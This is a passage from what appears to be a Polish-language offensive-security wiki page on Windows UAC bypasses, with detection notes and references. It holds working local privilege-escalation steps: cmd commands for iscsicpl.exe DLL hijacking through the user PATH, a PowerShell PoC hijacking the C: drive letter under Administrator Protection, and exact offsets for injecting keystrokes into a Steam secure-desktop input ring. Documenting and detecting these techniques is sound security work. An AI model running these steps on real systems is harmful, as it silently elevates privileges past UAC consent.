Polega na sprawdzeniu, czy **plik binarny z autoElevated** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** pliku **binarnego** lub **polecenia**, które ma zostać **uruchomione** (jest to ciekawsze, jeśli plik binarny szuka tych informacji w **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijacking z użyciem ścieżki użytkownika `PATH`

32-bitowy plik `C:\Windows\SysWOW64\iscsicpl.exe` to plik binarny z **auto-elevated**, którego można nadużyć, by załadować `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli umieścisz złośliwy plik `iscsiexe.dll` w folderze **zapisywalnym przez użytkownika**, a następnie zmodyfikujesz `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), tak aby ten folder był przeszukiwany, Windows może załadować bibliotekę DLL atakującego do podwyższonego procesu `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Uwagi praktyczne:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale z powodu UAC działa na poziomie **Medium Integrity**.
- W tym obejściu istotna jest kopia z folderu **SysWOW64**. Traktuj kopię z **System32** jako osobny plik binarny i niezależnie sprawdź jej działanie.
- Ta technika łączy **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam workflow ProcMon, którego używa się przy innych metodach UAC bypass, przyda się do sprawdzenia, czy brakująca biblioteka DLL jest ładowana.

Minimalny przebieg:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Pomysły na wykrywanie:
- Generuj alerty o `reg add` / zapisach w rejestrze do `HKCU\Environment\Path`, po których natychmiast następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Szukaj `iscsiexe.dll` w **kontrolowanych przez użytkownika** lokalizacjach, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem bibliotek DLL spoza standardowych katalogów Windows.

### Nowsze badania warte osobnego sprawdzenia

Niektóre łańcuchy opublikowane po 2024 roku nie przypominają już klasycznych przejęć rejestru `HKCU\Software\Classes`. Na przykład zatruwanie pamięci podręcznej kontekstu aktywacji może łączyć **zmianę mapowania dysku** i **przekierowanie DLL**, aby przejść z poziomu średniej do wysokiej integralności za pośrednictwem zaufanego interfejsu użytkownika / automatycznie podwyższanych uprawnień plików binarnych, takich jak `ctfmon.exe`, a następnie takich celów jak `fodhelper.exe`. Zamiast powielać tutaj obszerny PoC, sprawdź zwięzłe przykłady ładunków w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Przejęcie litery dysku przez mapę urządzeń DOS dla sesji logowania w Administrator Protection (wersja preview)

> [!NOTE]
> Według stanu na sierpień 2026 r. Microsoft nadal opisuje Administrator Protection jako **wersję preview dla Insiderów**: wdrożenie z października 2025 r. zostało wycofane i jest planowane na późniejszy termin. Przed testowaniem tych łańcuchów upewnij się, że **Admin Approval Mode z Administrator protection** jest rzeczywiście włączony, a urządzenie zostało ponownie uruchomione; sam numer wersji 25H2 w standardowej kompilacji nie dowodzi, że ta funkcja jest aktywna.<sup>[[10]](#references)</sup>

Pełny opis powierzchni ataku `RAiLaunchAdminProcess` / UIAccess w kompilacjach preview Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` przypisanymi do sesji. Katalog jest tworzony na żądanie przez `SeGetTokenDeviceMap` przy pierwszym rozpoznaniu ścieżki `\??`. Jeśli atakujący personifikuje token shadow-admin tylko na poziomie **SecurityIdentification**, katalog zostaje utworzony z atakującym jako **właścicielem** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie dowiązań liter dysków mających pierwszeństwo przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji o niskich uprawnieniach wywołaj `RAiProcessRunOnce`, aby uruchomić `runonce.exe` z uprawnieniami shadow-admin bez wyświetlania monitu.
2. Zduplikuj jego token podstawowy jako token **identyfikacyjny** i personifikuj go podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z atakującym jako właścicielem.
3. Utwórz tam dowiązanie symboliczne `C:` wskazujące na kontrolowany przez atakującego zasób; kolejne operacje na systemie plików w tej sesji będą rozpoznawać `C:` jako ścieżkę atakującego, umożliwiając przejęcie DLL/plików bez wyświetlania monitu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Na hostach preview Administrator Protection rejestruje zatwierdzenia i niepowodzenia jako zdarzenia ETW **15031** i **15032** w ramach dostawcy `Microsoft-Windows-LUA`. Zdarzenia zawierają SID żądającego, ścieżkę aplikacji, wynik, zarządzane konto administratora i metodę uwierzytelniania, więc powtarzające się próby exploitów lub nieudane sterowanie interfejsem użytkownika nie pozostają bez śladu w telemetrii.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Dane wejściowe secure desktop przekazywane przez zapisywalny pierścień pamięci współdzielonej

Pomocniczy proces secure desktop może osłabić ochronę monitu UAC, jeśli użytkownik o średnim poziomie integralności może zapisywać dane do jego IPC wejściowego. W opisanym projekcie Steam wywołanie `IClientSecureDesktop::BStartStreaming` uruchamia `secure_desktop_capture.exe` jako SYSTEM na `winsta0\winlogon`. Udostępnia ono `Global\SecureDesktopInput_mem-IPCWrapper` użytkownikom z uprawnieniem `GENERIC_ALL`; proces pomocniczy odczytuje wpisy pierścienia i wywołuje `SendInput` na secure desktop. To coś innego niż UIAccess lub zmiana `PromptOnSecureDesktop`: dane wejściowe przekazuje proces już działający w tym środowisku. Zobacz [uruchamianie IPC usługi](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc), aby dowiedzieć się, jak klient dociera do tego handlera. <sup>[[15]](#references)[[16]](#references)</sup>

Pierścień ma 128 slotów po 173 bajty. Liczniki zapisu i odczytu znajdują się pod adresami `0x414` i `0x418`, a slot `N` zaczyna się pod adresem `0x41c + 173*N`. Ustaw pierwszy bajt slotu na `0` dla danych w postaci jawnej, skopiuj bezpośrednio za nim 40-bajtową strukturę Windows `INPUT`, a następnie zwiększ licznik zapisu. W przypadku administratora o średnim poziomie integralności, który widzi monit zgody, naciśnięcie i zwolnienie klawisza `Y` może aktywować przycisk potwierdzający UAC po uruchomieniu pliku wykonywalnego żądającego podniesienia uprawnień; nie pozwala jednak odpowiedzieć na monit o poświadczenia dla użytkownika standardowego. **Zgoda użytkownika nadal ma znaczenie**: proces pomocniczy przekazuje dane wejściowe dopiero wtedy, gdy użytkownik zatwierdzi monit `InputEnabled` na bieżący 90-dniowy okres autoryzacji. Samo istnienie mapowania z prawami odczytu i zapisu nie dowodzi, że dane wejściowe docierają do monitu; podczas kontrolowanego testu porównaj licznik odczytu przed testem i po nim. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa Kontrola konta użytkownika](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcja technik obejścia UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skaner zgodności i program uruchamiający do obejścia UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacja TrueChaos: wykorzystanie podatności 0-Day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie ochrony administratora systemu Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Obejście UAC za pomocą zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Obejścia UnifiedConsent, TabTip i Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ochrona administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Wywoływanie lokalnych serwerów RPC systemu Windows z .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte wzbogaca CoolClient o podpisany rootkit jądra Windows](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: w pełni niewykrywalny trojan Windows stworzony do szpiegowania, kradzieży i terroryzowania](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Otwieranie zaworu](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – Proof of concept do „Turning the Valve”](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
